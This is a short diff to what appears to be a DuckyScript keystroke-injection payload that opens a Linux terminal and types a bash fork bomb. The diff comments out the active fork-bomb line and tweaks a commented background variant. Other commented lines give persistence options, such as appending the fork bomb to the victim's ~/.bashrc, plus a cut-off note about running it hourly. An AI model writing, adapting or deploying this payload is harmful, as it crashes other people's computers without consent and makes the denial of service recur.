@@ -12,10 +12,10 @@ WINDOWS d
 DELAY 300
 CTRL-ALT t
 DELAY 2000
-STRING :(){ :|:& };:
+REM STRING :(){ :|:& };:
 ENTER
 REM If you want to do it in the background so you can close the terminal with adding ALT F4
-REM STRING nohup :(){ :|:& };: >> /dev/null &
+REM STRING nohup :(){ :|:& };: >> /dev/null & disown
 REM if you want to do it every time they open a terminal like drapl0n's terminalbomb style
 REM STRING echo ":(){ :|:& };:" >> ~/.bashrc
 REM if you want to make it happen every hour
